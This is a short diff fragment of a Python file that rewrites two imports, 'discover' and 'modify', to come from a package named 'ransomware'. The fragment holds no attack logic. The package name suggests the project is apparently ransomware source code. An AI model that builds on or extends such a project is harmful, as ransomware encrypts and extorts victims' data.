@@ -9,8 +9,8 @@ import sys
 import base64
 import platform 
 
-import discover
-import modify
+from ransomware import discover
+from ransomware import modify
 
 # -----------------
 # GLOBAL VARIABLES
